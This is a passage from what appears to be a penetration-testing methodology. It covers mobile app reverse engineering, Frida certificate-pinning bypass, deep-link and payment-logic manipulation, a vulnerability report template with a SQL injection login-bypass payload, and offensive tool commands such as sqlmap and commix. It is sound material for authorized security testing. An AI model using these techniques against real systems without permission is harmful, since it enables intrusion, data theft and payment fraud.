# Self-referral
referrer=my_own_account

# Fake referrals
# Create multiple accounts
```

### 8.6 Subscription/Payment Bypass
```bash
# Extend trial period
trial_end_date=2099-12-31

# Manipulate subscription status
is_subscribed=true
subscription_level=premium
```

---

## Phase 9: Mobile Application Security

### 9.1 Android Testing

#### APK Decompilation
```bash
# Extract APK
adb pull /data/app/com.example.app/base.apk

# Decompile
apktool d base.apk

# Convert to JAR
d2j-dex2jar base.apk

# Decompile JAR
jadx base.apk
jd-gui base.jar
```

#### Reverse Engineering
```bash
# Static analysis
grep -r "api_key" com/
grep -r "password" com/
grep -r "secret" com/
grep -r "http://" com/

# Dynamic analysis with Frida
frida -U -f com.example.app
```

#### Certificate Pinning Bypass
```bash
# Frida script
frida --codeshare akabe1/frida-multiple-unpinning -U -f com.example.app

# Manual method
# Decompile, remove pinning code, recompile
```

#### Deep Link Exploitation
```bash
# Find deep links in AndroidManifest.xml
<intent-filter>
  <data android:scheme="myapp" android:host="open" />
</intent-filter>

# Test deep links
adb shell am start -W -a android.intent.action.VIEW -d "myapp://open/admin"
```

#### Insecure Data Storage
```bash
# SharedPreferences
adb shell
cd /data/data/com.example.app/shared_prefs/
cat *.xml

# SQLite databases
cd /data/data/com.example.app/databases/
sqlite3 database.db
.tables
SELECT * FROM users;

# Check for sensitive data
grep -r "password" /data/data/com.example.app/
```

### 9.2 iOS Testing

#### IPA Analysis
```bash
# Extract IPA (jailbroken device)
# Use tools like: Clutch, frida-ios-dump

# Unzip IPA
unzip app.ipa

# Analyze with class-dump
class-dump Payload/App.app/App

# Frida on iOS
frida -U -f com.example.app
```

#### Insecure Data Storage
```bash
# NSUserDefaults
plutil -p /var/mobile/Containers/Data/Application/[UUID]/Library/Preferences/com.example.app.plist

# Keychain (requires jailbreak)
# Use Keychain-Dumper

# Core Data / SQLite
cd /var/mobile/Containers/Data/Application/[UUID]/
find . -name "*.sqlite"
```

---

## Phase 10: Reporting & Documentation

### 10.1 Vulnerability Report Template

#### Title
```
[Severity] Vulnerability Type in Component
Example: [High] SQL Injection in Login Form
```

#### Summary
```
Brief one-paragraph description of the vulnerability and its impact.
```

#### Severity Rating
```
Critical / High / Medium / Low / Informational
CVSS Score: 9.1 (Critical)
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
```

#### Vulnerability Details

**CWE Classification:** CWE-89 (SQL Injection)

**Affected Component:**
- URL: https://target.com/login
- Parameter: username
- Method: POST

**Description:**
Detailed technical explanation of the vulnerability. Include:
- What is vulnerable
- Why it's vulnerable
- How it can be exploited
- Technical root cause

**Preconditions:**
- List any requirements (authentication, specific role, etc.)

#### Proof of Concept

**Step-by-Step Reproduction:**
1. Navigate to https://target.com/login
2. In the username field, enter: `admin' OR '1'='1'--`
3. In the password field, enter: anything
4. Click Submit
5. Observe successful authentication bypass

**HTTP Request:**
```http
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=admin'+OR+'1'%3D'1'--&password=test
```

**HTTP Response:**
```http
HTTP/1.1 302 Found
Location: /dashboard
Set-Cookie: session=eyJhZG1pbiI6dHJ1ZX0=
```

**Screenshots/Video:**
[Attach screenshots or video demonstration]

#### Impact Analysis

**Confidentiality:** High - Attacker can access all user data
**Integrity:** High - Attacker can modify database records
**Availability:** Low - No direct impact on availability

**Business Impact:**
- Unauthorized access to admin panel
- Data breach of user credentials
- Potential regulatory compliance violations (GDPR, CCPA)
- Reputational damage

**Attack Scenario:**
An unauthenticated attacker can bypass authentication and gain administrative access to the application. This allows them to view, modify, or delete sensitive user data, potentially affecting thousands of users.

#### Remediation

**Short-term Mitigation:**
- Immediately implement input validation to reject special characters
- Add Web Application Firewall (WAF) rules to block SQL injection patterns

**Long-term Fix:**
- Use parameterized queries (prepared statements) for all database interactions
- Implement proper input validation and sanitization
- Apply principle of least privilege to database user accounts
- Enable database query logging and monitoring

**Secure Code Example:**
```python
# Vulnerable code
query = "SELECT * FROM users WHERE username='" + username + "' AND password='" + password + "'"
cursor.execute(query)

# Secure code
query = "SELECT * FROM users WHERE username=%s AND password=%s"
cursor.execute(query, (username, password))
```

#### References
- CWE-89: SQL Injection - https://cwe.mitre.org/data/definitions/89.html
- OWASP SQL Injection - https://owasp.org/www-community/attacks/SQL_Injection
- OWASP Testing Guide: SQL Injection - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection

#### Timeline
- Discovered: 2024-01-15
- Reported: 2024-01-15
- Triaged: [Pending]
- Resolved: [Pending]

---

### 10.2 Finding Severity Guidelines

#### Critical
- RCE (Remote Code Execution)
- Authentication bypass allowing admin access
- SQL injection with sensitive data exposure
- Significant data breach potential
- Payment manipulation resulting in financial loss

#### High
- Privilege escalation (user → admin)
- Stored XSS on high-traffic pages
- IDOR exposing sensitive PII
- Significant business logic flaws
- Account takeover vulnerabilities

#### Medium
- Reflected XSS
- CSRF on important functions
- IDOR exposing non-sensitive data
- Information disclosure (medium sensitivity)
- Weak cryptography

#### Low
- CSRF on low-impact functions
- Information disclosure (low sensitivity)
- Open redirect
- Clickjacking
- Missing security headers

#### Informational
- SSL/TLS configuration issues
- Version disclosure
- Descriptive error messages
- Missing best practices (non-exploitable)

---

## Tools Quick Reference

### Reconnaissance
```bash
subfinder -d target.com -all -o subs.txt
httpx -l subs.txt -o alive.txt
nuclei -l alive.txt -t exposures/ -severity critical,high
waybackurls target.com | unfurl keys > params.txt
katana -u https://target.com -jc | tee js-files.txt
arjun -u https://target.com/endpoint
```

### Vulnerability Scanning
```bash
nuclei -l alive.txt -t ~/nuclei-templates/ -o results.txt
nikto -h https://target.com
wpscan --url https://target.com --api-token TOKEN
testssl.sh https://target.com
```

### Exploitation
```bash
sqlmap -u "URL" --batch --level=2 --risk=2
dalfox url https://target.com/page?q=FUZZ
commix -u "URL?cmd=test"
ffuf -u https://target.com/FUZZ -w wordlist.txt
```

### Manual Testing (Burp Suite)
- Proxy → Intercept traffic
- Repeater → Modify and resend requests
- Intruder → Automated attacks
- Scanner → Automated vulnerability detection
- Extensions: Autorize, Active Scan++, JWT Editor, Param Miner

---

## Rate Limiting & Ethics

### Default Rate Limits
```bash
export RATE_LIMIT=10  # requests per second
export MAX_THREADS=50
export TIMEOUT=30
```

### Pre-Flight Checklist
- ✓ Target is in scope
- ✓ Actions are allowed
- ✓ Using test accounts
- ✓ Rate limits configured
- ✓ No production impact
- ✓ Human approved high-risk actions

### Stop Conditions
- ❌ Scope ambiguity
- ❌ Potential harm/impact
- ❌ Production user data access
- ❌ Unintended system behavior
- ❌ Legal/ethical concerns
- ❌ Evidence of active breach

---

**This methodology represents comprehensive web application penetration testing expertise. Adapt techniques based on target technology stack, scope, and authorization.**
